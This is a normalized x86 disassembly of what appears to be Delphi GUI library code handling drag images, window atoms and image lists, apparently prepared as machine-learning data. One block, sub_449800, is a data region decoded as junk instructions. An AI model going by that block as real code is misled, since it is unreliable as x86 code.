push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
movzx edx bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_449174
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403f64
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403f64
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403f64
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403f64
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404e44
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_404e44
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4491fc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_449374
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_40ada8
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404e98
mov eax [ rw-data ]
call sub_405324
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_40ada8
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404e98
mov eax [ rw-data ]
call sub_405324
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_405324
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416a38
mov [ rw-data ] eax
call sub_448e04
mov dl 0x1
mov eax [ r-xdata ]
call sub_448bb0
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455d28
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f30
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_458fe4
mov ecx r-xdata
mov edx sub_438df8
mov eax [ r-xdata ]
call sub_416188
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44937b
lea eax [ ebp - 0x10 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4493c8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov [ edi + 0x4 ] esi
mov eax [ edi ]
mov edx edi
call [ eax + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_44940c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_416eac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_449488
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0xc ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
sub_4494e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_4495bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov [ ebx + 0x164 ] 0x1
or [ ebx + 0x54 ] 0x4000
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebx + 0x164 ] 0x0
and [ ebx + 0x54 ] 0xbfff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x10 ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x14 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
add ecx edi
mov edx eax
add edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4495cc
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_4495eb ]
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ec84
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
sub_449794
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4497f3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4497fa
retn
mov eax rw-data
call sub_40f8bc
call sub_449174
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_405af0
sub_449800
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
cwde
inc esp
add [ eax - 0x68 ] dl
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax + edx + 0x41ac0040 ] bh
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x52 ] ch
inc esp
add [ ecx ] al
add bh bh
[ esi + ebp * 4 + 0x540b0044 ]
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
les ebx [ eax + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + 0x44 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx - 0x66efffbc ] bl
inc esp
add [ eax ] ch
add [ eax ] al
jo r-xdata
inc esp
add [ eax - 0x61 ] ah
inc ecx
add al ch
loope r-xdata
mov eax 0x20000000
retn
je r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add ah bl
cdq
inc esp
add [ esp ] dh
inc esp
add al al
cmpsd [ esi ] [ edi ]
inc esp
add [ eax - 0x5d ] dh
inc esp
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x2800408d
cdq
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
insb
push ecx
inc ecx
add [ edx ] al
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
inc esp
add [ eax - 0x66 ] cl
inc esp
add [ esp + ebp * 4 + 0x44 ] dh
add [ eax ] al
lodsd [ esi ]
inc esp
add [ eax - 0x5b ] bh
inc esp
add [ ecx ] al
add bh ch
dec [ eax + 0x100044a5 ]
push esp
inc ebx
jne r-xdata
add [ eax + 0x60004499 ] dl
lahf
ror [ ebx + 0x40b1e8c6 ] cl
std
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 + 0x15e80f74 ] 0xa9
sti
jmp [ edi + ecx * 4 + 0x5 ]
outsd
sub_449990
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41da5c
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4499dc
push ebx
push esi
push edi
call sub_404330
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4168b0
mov edx eax
mov eax edi
call sub_44a5d8
mov eax [ edi + 0x50 ]
call sub_403f64
mov eax edi
call sub_449ca0
mov eax [ edi + 0x4c ]
call sub_403f64
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41daa8
test bl bl
jle r-xdata
call sub_403f64
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042d8
sub_449a48
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_449af5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44a560
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_449b14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449afc
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_449b14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449bb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4294f4
mov eax ebx
call sub_4288e0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423ec8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4288e0
pop edx
call sub_42426c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449bbc
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_449bd8
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_449b14
pop ecx
pop edx
pop ebx
retn
sub_449c10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449ca0
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_449bd8
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_404160
sub_449c4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a4e8
test esi esi
je r-xdata
mov eax [ ebx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov eax esi
call sub_42894c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x68 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449ca0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_404160
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_449c3c
push eax
call ImageList_Destroy
sub_449cd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_449d6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
movzx eax [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_449b00
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449d71
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov edx eax
mov eax ebx
call sub_449f00
sub_449d78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449e27
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_449e0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_449b08
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_449c4c
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449c4c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449e11
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
sub_449e44
push ebx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_449c3c
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_449e68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449ee7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_449e44
cmp esi eax
jl r-xdata
mov eax ebx
call sub_449b00
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
mov eax ebx
mov si 0xffef
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449eee
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
push esi
mov eax ebx
call sub_449c3c
push eax
call ImageList_Remove
sub_449f00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_449950
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_404160
pop esi
pop ebx
retn
sub_449f38
push ebx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_449c3c
push eax
call ImageList_GetBkColor
call sub_449970
pop ebx
retn
sub_449f60
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_449950
push eax
mov eax ebx
call sub_449f38
call sub_449950
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_42455c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_449c3c
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4288e0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423ec8
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_415370
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4288e0
pop edx
call sub_42426c
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4288e0
call sub_42455c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_449c3c
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_415370
mov eax [ ebx + 0x54 ]
call sub_4288e0
call sub_42455c
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_423ec8
mov eax edi
call sub_42455c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_423ec8
mov eax edi
call sub_42455c
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_429710
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_44a134
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ eax + 0x40 ]
push ebx
movzx ebx [ eax + 0x43 ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_44a15c
pop ebx
pop ebp
retn 0xc
sub_44a15c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_449b00
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44a1a8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_415370
mov eax [ ebp - 0x4 ]
call sub_44ae44
xor eax eax
push ebp
push sub_44a341
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44a324
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44a307
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_429710
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a30e
mov eax [ ebp - 0x10 ]
call sub_403f64
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4288e0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_42426c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_42455c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4288e0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_42426c
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_42455c
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449d78
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44a350
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
